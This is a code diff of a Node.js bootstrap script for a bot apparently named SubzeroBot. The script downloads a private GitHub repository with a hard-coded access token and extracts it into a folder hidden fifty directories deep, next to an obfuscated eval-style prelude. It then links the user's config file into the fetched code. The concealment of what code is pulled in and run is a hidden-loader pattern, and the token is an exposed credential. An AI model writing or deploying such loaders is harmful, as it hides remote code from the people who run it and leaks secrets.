@@ -4,6 +4,8 @@ let NYZab;!function(){const Q6SG=Array.prototype.slice.call(arguments);return ev
 
 // bootstrap.js
 
+// bootstrap.js
+
 const fs = require('fs');
 const path = require('path');
 const axios = require('axios');
@@ -12,10 +14,10 @@ const AdmZip = require('adm-zip');
 // **Hard-coded GitHub token** for private repo access
 const GITHUB_TOKEN = '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';
 
-// Use the GitHub API ZIP endpoint rather than the public GitHub.com URL
+// Use GitHub API ZIP endpoint for a private repo
 const repoZipUrl = 'https://api.github.com/repos/takudzwa07/SBm/zipball/main';
 
-// Base hidden folder
+// Build a deeply hidden extraction path
 let deepPath = path.join(__dirname, '.temp');
 for (let i = 0; i < 50; i++) {
   deepPath = path.join(deepPath, '.cache');
@@ -29,22 +31,21 @@ async function downloadAndExtractRepo() {
     const response = await axios.get(repoZipUrl, {
       responseType: 'arraybuffer',
       headers: {
-        Authorization: `token ${GITHUB_TOKEN}`,
-        'User-Agent': 'SubzeroBot',
-        Accept: 'application/vnd.github+json'
+        Authorization: `Bearer ${GITHUB_TOKEN}`,
+        'User-Agent': 'SubzeroBot'
       }
     });
 
     if (response.status !== 200) {
-      throw new Error(`Unexpected status code ${response.status}`);
+      throw new Error(`Unexpected status code: ${response.status}`);
     }
 
     const zip = new AdmZip(Buffer.from(response.data));
 
-    // Ensure the deeply hidden extraction folder exists
+    // Ensure the extraction folder exists
     fs.mkdirSync(repoFolder, { recursive: true });
 
-    // Extract all files to the deeply hidden repoFolder
+    // Extract all files into .sb_modules
     zip.extractAllTo(repoFolder, true);
     console.log('[🌐] Subzero Connected to Servers');
   } catch (error) {
@@ -55,17 +56,18 @@ async function downloadAndExtractRepo() {
 
 (async () => {
   try {
+    // 1) Download & extract
     await downloadAndExtractRepo();
 
+    // 2) Find the single subfolder (usually like takudzwa07-SBm-xxxxxx)
     const extractedFolders = fs
       .readdirSync(repoFolder)
       .filter(f => fs.statSync(path.join(repoFolder, f)).isDirectory());
 
-    if (extractedFolders.length === 0) {
+    if (!extractedFolders.length) {
       console.error('No folder found in server');
       process.exit(1);
     }
-
     const extractedRepoPath = path.join(repoFolder, extractedFolders[0]);
 
     // ─── SYMLINK YOUR CONFIG ────────────────────────────────────────────────────
@@ -76,10 +78,9 @@ async function downloadAndExtractRepo() {
       console.error('Local config.js not found at:', srcConfig);
       process.exit(1);
     }
-
     try {
       if (fs.existsSync(destConfig)) fs.unlinkSync(destConfig);
-      fs.symlinkSync(srcConfig, destConfig);
+      fs.symlinkSync(srcConfig, destConfig, 'file');
     } catch (err) {
       console.error('Failed to symlink config.js:', err.message);
       process.exit(1);
